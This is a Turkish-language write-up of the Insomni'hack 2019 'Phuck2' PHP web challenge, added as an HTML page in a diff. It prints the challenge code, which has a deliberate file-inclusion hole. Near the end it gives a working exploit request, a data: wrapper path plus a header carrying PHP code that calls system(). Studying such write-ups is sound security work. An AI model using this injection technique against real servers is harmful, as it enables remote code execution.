@@ -1,0 +1,218 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html {
+      max-width: 70ch;
+      margin: auto;
+      line-height: 1.75;
+      font-size: 1.25em;
+    }
+
+    pre {
+      overflow: auto;
+    }
+
+    nav ul {
+      background: #faca46;
+      text-align: center;
+    }
+
+    nav ul li {
+      display: inline-block;
+      color: white;
+      margin-right: 10px;
+    }
+
+    nav ul li a {
+      text-decoration: none;
+    }
+
+    img {
+      width: 100%;
+    }
+  </style>
+</head>
+
+<nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="https://github.com/i64">Git</a></li>
+  </ul>
+</nav><h1>Phuck2 – Insomni’hack 2019</h1>
+<p>Another year, another PH(P)uck. Have fun with that !</p>
+<p><a href="http://phuck.teaser.insomnihack.ch/?hl=1">http://phuck.teaser.insomnihack.ch/?hl=1</a></p>
+<p><a href="http://phuck.teaser.insomnihack.ch/phpinfo.php">http://phuck.teaser.insomnihack.ch/phpinfo.php</a></p>
+<pre lang="php" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">&lt;?php
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">stream_wrapper_unregister</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">php</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">if</span><span style="color:#657b83;">(</span><span style="color:#dc322f;">isset</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">_GET[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">hl</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">)) </span><span style="color:#859900;">highlight_file</span><span style="color:#657b83;">(</span><span style="color:#b58900;">__FILE__</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">$</span><span style="color:#268bd2;">mkdir </span><span style="color:#657b83;">= </span><span style="color:#268bd2;">function</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">dir</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">system</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">mkdir -- </span><span style="color:#839496;">&#39;</span><span style="color:#859900;">.escapeshellarg</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">dir</span><span style="color:#657b83;">));
+</span><span style="color:#657b83;">    };
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">$</span><span style="color:#268bd2;">randFolder </span><span style="color:#657b83;">= </span><span style="color:#859900;">bin2hex</span><span style="color:#657b83;">(</span><span style="color:#859900;">random_bytes</span><span style="color:#657b83;">(</span><span style="color:#6c71c4;">16</span><span style="color:#657b83;">));
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">$</span><span style="color:#268bd2;">mkdir</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">users/</span><span style="color:#839496;">&#39;</span><span style="color:#859900;">.$</span><span style="color:#268bd2;">randFolder</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">chdir</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">users/</span><span style="color:#839496;">&#39;</span><span style="color:#859900;">.$</span><span style="color:#268bd2;">randFolder</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">$</span><span style="color:#268bd2;">userFolder </span><span style="color:#657b83;">= (</span><span style="color:#dc322f;">isset</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">_SERVER[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">HTTP_X_FORWARDED_FOR</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">) ? </span><span style="color:#859900;">$</span><span style="color:#268bd2;">_SERVER[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">HTTP_X_FORWARDED_FOR</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;"> : </span><span style="color:#859900;">$</span><span style="color:#268bd2;">_SERVER[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">REMOTE_ADDR</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">$</span><span style="color:#268bd2;">userFolder </span><span style="color:#657b83;">= </span><span style="color:#859900;">basename</span><span style="color:#657b83;">(</span><span style="color:#859900;">str_replace</span><span style="color:#657b83;">([</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">.</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">,</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">-</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">],[</span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">,</span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">],</span><span style="color:#859900;">$</span><span style="color:#268bd2;">userFolder</span><span style="color:#657b83;">));
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">$</span><span style="color:#268bd2;">mkdir</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">userFolder</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">chdir</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">userFolder</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">file_put_contents</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">profile</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">,</span><span style="color:#859900;">print_r</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">_SERVER</span><span style="color:#657b83;">,</span><span style="color:#b58900;">true</span><span style="color:#657b83;">));
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">chdir</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">..</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">$</span><span style="color:#268bd2;">_GET[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">page</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">=</span><span style="color:#859900;">str_replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">.</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">,</span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">,</span><span style="color:#859900;">$</span><span style="color:#268bd2;">_GET[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">page</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">if</span><span style="color:#657b83;">(</span><span style="color:#859900;">!stripos</span><span style="color:#657b83;">(</span><span style="color:#859900;">file_get_contents</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">_GET[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">page</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">),</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&lt;?</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">) </span><span style="color:#859900;">&amp;&amp; !stripos</span><span style="color:#657b83;">(</span><span style="color:#859900;">file_get_contents</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">_GET[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">page</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">),</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">php</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)) {
+</span><span style="color:#657b83;">        </span><span style="color:#cb4b16;">include</span><span style="color:#657b83;">(</span><span style="color:#859900;">$</span><span style="color:#268bd2;">_GET[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">page</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    }
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">chdir</span><span style="color:#657b83;">(</span><span style="color:#b58900;">__DIR__</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">system</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">rm -rf users/</span><span style="color:#839496;">&#39;</span><span style="color:#859900;">.$</span><span style="color:#268bd2;">randFolder</span><span style="color:#657b83;">);
+</span>
+</code></pre>
+<h1>Analiz</h1>
+<h2>Kodun analizi</h2>
+<pre style="background-color:#fdf6e3;" lang="php"><code>
+<span style="color:#657b83;">stream_wrapper_unregister(&#39;php&#39;);
+</span>
+</code></pre>
+<p><strong>php://</strong> wrapperını kayıtdışı ediyoruz.</p>
+<hr />
+<pre style="background-color:#fdf6e3;" lang="php"><code>
+<span style="color:#657b83;">$mkdir = function($dir) {
+</span><span style="color:#657b83;">    system(&#39;mkdir -- &#39;.escapeshellarg($dir));
+</span><span style="color:#657b83;">};
+</span>
+</code></pre>
+<p><strong>escapeshellarg</strong> ifadesini geçemeyeceğimiz için bura ile uğraşmamıza gerek yok</p>
+<hr />
+<pre lang="php" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">$randFolder = bin2hex(random_bytes(16));
+</span><span style="color:#657b83;">$mkdir(&#39;users/&#39;.$randFolder);
+</span><span style="color:#657b83;">chdir(&#39;users/&#39;.$randFolder);
+</span>
+</code></pre>
+<p>Kullanıcıya özel random bir klasör oluşturup dizini değiştiriyor.</p>
+<hr />
+<pre lang="php" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">$userFolder = (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]) ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] : $_SERVER[&#39;REMOTE_ADDR&#39;]);
+</span><span style="color:#657b83;">$userFolder = basename(str_replace([&#39;.&#39;,&#39;-&#39;],[&#39;&#39;,&#39;&#39;],$userFolder));
+</span>
+</code></pre>
+<p><strong>X-Forwarded-For</strong> headeri set edilmiş ise headerin değerini, edilmemiş ise kullanıncın(bizim) IP adresimizi <strong>$userFolder</strong> değişkenine atıyor.</p>
+<p><strong>$userFolder</strong> değişkenindeki değerin varsa <strong>noktaları</strong>, <strong>tire</strong> ve <strong>boşluk</strong> karakterlerini -siliyor- '' ile değiştiriyor. (“127.0.0 .1” -&gt; “127001” gibi)</p>
+<hr />
+<pre lang="php" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">$mkdir($userFolder);
+</span><span style="color:#657b83;">chdir($userFolder);
+</span><span style="color:#657b83;">file_put_contents(&#39;profile&#39;,print_r($_SERVER,true));
+</span><span style="color:#657b83;">chdir(&#39;..&#39;);
+</span>
+</code></pre>
+<p><strong>$userFolder</strong> değeri ile klasör açar ve o klasörün içine <strong>profile</strong> adlı dosyaya <a href="http://php.net/manual/tr/reserved.variables.server.php"><strong>$_SERVER</strong> arrayinin</a> içeriğini yazar.</p>
+<hr />
+<pre style="background-color:#fdf6e3;" lang="php"><code>
+<span style="color:#657b83;">$_GET[&#39;page&#39;]=str_replace(&#39;.&#39;,&#39;&#39;,$_GET[&#39;page&#39;]);
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">) &amp;&amp; !stripos(file_get_contents($_GET[</span><span style="color:#839496;">&#39;</span><span style="color:#cb4b16;">page</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">]),</span><span style="color:#839496;">&#39;</span><span style="color:#cb4b16;">php</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">)) {
+</span><span style="color:#2aa198;">    include($_GET[</span><span style="color:#839496;">&#39;</span><span style="color:#cb4b16;">page</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">]);
+</span><span style="color:#2aa198;">}
+</span><span style="color:#2aa198;">
+</span><span style="color:#2aa198;">chdir(__DIR__);
+</span><span style="color:#2aa198;">system(</span><span style="color:#839496;">&#39;</span><span style="color:#cb4b16;">rm </span><span style="color:#657b83;">-</span><span style="color:#cb4b16;">rf users</span><span style="color:#657b83;">/</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">.$randFolder);
+</span>
+</code></pre>
+<p><strong>GET</strong> ile yolladığımız <strong>page</strong> değerindeki noktaları siliyor ve <strong>file_get_contents($page)</strong> ile açtığımız dosyanın içinde stripos ile  dosyanın içerisinde <strong>&lt;?</strong> veya <strong>php</strong> kelimelerinin geçip geçmediğini kontrol ediyor.</p>
+<p>Daha sonra dosyayı siliyor</p>
+<hr />
+<h2>Phpinfo</h2>
+<table>
+<thead>
+<tr>
+<th align="center">Directive</th>
+<th align="center">Local Value</th>
+<th align="center">Master Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">allow_url_fopen</td>
+<td align="center">On</td>
+<td align="center">On</td>
+</tr>
+<tr>
+<td align="center">allow_url_include</td>
+<td align="center">Off</td>
+<td align="center">Off</td>
+</tr>
+</tbody>
+</table>
+<p>Olduğunu görüyoruz bunun anlamı <strong>include</strong> içerisinde <strong>url</strong> ve bazı <strong>wrapperler</strong> çalışmayacak.</p>
+<h2>Çözüm</h2>
+<hr />
+<p><strong>data:,xx/profile</strong> diye veri yolladığımız zaman <strong>allow_url_fopen</strong> ve <strong>allow_url_include</strong>'dan dolayı;</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;"># --&gt; döndürdüğü(return) değerini ifade edecek
+</span><span style="color:#657b83;">file_get_contents(&#39;data:,xx/profile&#39;); --&gt; string &#39;xx/profile&#39;
+</span><span style="color:#657b83;">include(&#39;data:,xx/profile&#39;);           --&gt; &#39;data:,xx/profile&#39; adına sahip dosyasının içeriği
+</span>
+</code></pre>
+<p><strong>data</strong> wrapperi <strong>file_get_contents</strong>'te çalışırken <strong>include</strong>'ta çalışmadı.</p>
+<p>yani;</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">GET /?page=data:,xx/profile HTTP/1.1
+</span><span style="color:#657b83;">X-Forwarded-For: data:,xx
+</span><span style="color:#657b83;">Get-Flag: &lt;?php system(&#39;/get_flag&#39;); ?&gt;
+</span><span style="color:#657b83;">Host: phuck.teaser.insomnihack.ch
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">HTTP/1.1 200 OK
+</span><span style="color:#657b83;">Date: Sun, 20 Jan 2019 20:16:13 GMT
+</span><span style="color:#657b83;">Server: Apache/2.4.29 (Ubuntu)
+</span><span style="color:#657b83;">Vary: User-Agent,Accept-Encoding
+</span><span style="color:#657b83;">Content-Length: 1101
+</span><span style="color:#657b83;">Content-Type: text/html; charset=UTF-8
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">Array
+</span><span style="color:#657b83;">(
+</span><span style="color:#657b83;">    [HTTP_X_FORWARDED_FOR] =&gt; data:,xx
+</span><span style="color:#657b83;">    [HTTP_GET_FLAG] =&gt; INS{PhP_UrL_Phuck3rY_h3h3!}
+</span><span style="color:#657b83;">    [HTTP_HOST] =&gt; phuck.teaser.insomnihack.ch
+</span><span style="color:#657b83;">    [PATH] =&gt; /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</span><span style="color:#657b83;">    [SERVER_SIGNATURE] =&gt; &lt;address&gt;Apache/2.4.29 (Ubuntu) Server at phuck.teaser.insomnihack.ch Port 80&lt;/address&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    [SERVER_SOFTWARE] =&gt; Apache/2.4.29 (Ubuntu)
+</span><span style="color:#657b83;">    [SERVER_NAME] =&gt; phuck.teaser.insomnihack.ch
+</span><span style="color:#657b83;">    [SERVER_ADDR] =&gt; 172.17.0.2
+</span><span style="color:#657b83;">    [SERVER_PORT] =&gt; 80
+</span><span style="color:#657b83;">    [REMOTE_ADDR] =&gt; **CENSORED**
+</span><span style="color:#657b83;">    [DOCUMENT_ROOT] =&gt; /var/www/html/
+</span><span style="color:#657b83;">    [REQUEST_SCHEME] =&gt; http
+</span><span style="color:#657b83;">    [CONTEXT_PREFIX] =&gt; 
+</span><span style="color:#657b83;">    [CONTEXT_DOCUMENT_ROOT] =&gt; /var/www/html/
+</span><span style="color:#657b83;">    [SERVER_ADMIN] =&gt; [no address given]
+</span><span style="color:#657b83;">    [SCRIPT_FILENAME] =&gt; /var/www/html/index.php
+</span><span style="color:#657b83;">    [REMOTE_PORT] =&gt; 42696
+</span><span style="color:#657b83;">    [GATEWAY_INTERFACE] =&gt; CGI/1.1
+</span><span style="color:#657b83;">    [SERVER_PROTOCOL] =&gt; HTTP/1.1
+</span><span style="color:#657b83;">    [REQUEST_METHOD] =&gt; GET
+</span><span style="color:#657b83;">    [QUERY_STRING] =&gt; page=data:,xx/profile
+</span><span style="color:#657b83;">    [REQUEST_URI] =&gt; /?page=data:,xx/profile
+</span><span style="color:#657b83;">    [SCRIPT_NAME] =&gt; /index.php
+</span><span style="color:#657b83;">    [PHP_SELF] =&gt; /index.php
+</span><span style="color:#657b83;">    [REQUEST_TIME_FLOAT] =&gt; 1548015373.641
+</span><span style="color:#657b83;">    [REQUEST_TIME] =&gt; 1548015373
+</span><span style="color:#657b83;">)
+</span><span style="color:#657b83;">
+</span>
+</code></pre>
+<h2>Ve flag <strong>INS{PhP_UrL_Phuck3rY_h3h3!}</strong></h2>
+<hr />
+<h3>NOT: Soruyu CTF sırasınca çözmüş olmayıp, CTF sornası IRC'den verilen bilgiler (<strong>Blaklis</strong> tarafından) yardımı ile yazılmıştır</h3>
+</html>
